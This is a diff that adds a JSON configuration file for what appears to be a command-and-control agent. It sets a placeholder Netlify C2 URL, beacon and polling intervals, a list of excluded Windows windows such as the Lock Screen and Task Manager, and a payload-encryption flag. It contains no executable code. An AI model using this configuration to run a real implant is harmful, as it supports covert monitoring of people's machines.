@@ -1,0 +1,15 @@
+{
+  "c2_url": "https://your-netlify-site.netlify.app",
+  "c2_port": 443,
+  "agent_id": "auto",
+  "check_interval_seconds": 30,
+  "heartbeat_interval_seconds": 60,
+  "config_poll_interval_seconds": 300,
+  "blacklist_windows": [
+    "Lock Screen",
+    "Logon UI",
+    "Windows Security",
+    "Task Manager"
+  ],
+  "encrypt_payload": false
+}
